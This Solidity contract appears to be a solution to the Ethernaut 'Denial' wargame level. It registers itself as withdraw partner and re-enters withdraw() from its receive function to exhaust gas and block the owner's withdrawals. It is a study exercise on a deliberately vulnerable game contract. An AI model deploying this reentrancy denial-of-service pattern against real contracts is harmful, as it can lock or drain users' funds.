// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface DenialEthernaut {
    function withdraw() external;

    function setWithdrawPartner(address _partner) external;
}

contract Denial {
    DenialEthernaut public en;

    constructor() payable {
        en = DenialEthernaut(
            address(0x346cFaf79fd8f440f5E6D5129E94Ee8F4d96BE53)
        );
        address(en).call{value: 100}("");
        en.setWithdrawPartner(address(this));
    }

    receive() external payable {
        address(en).call{value: address(this).balance}("");
        en.withdraw();
    }
}
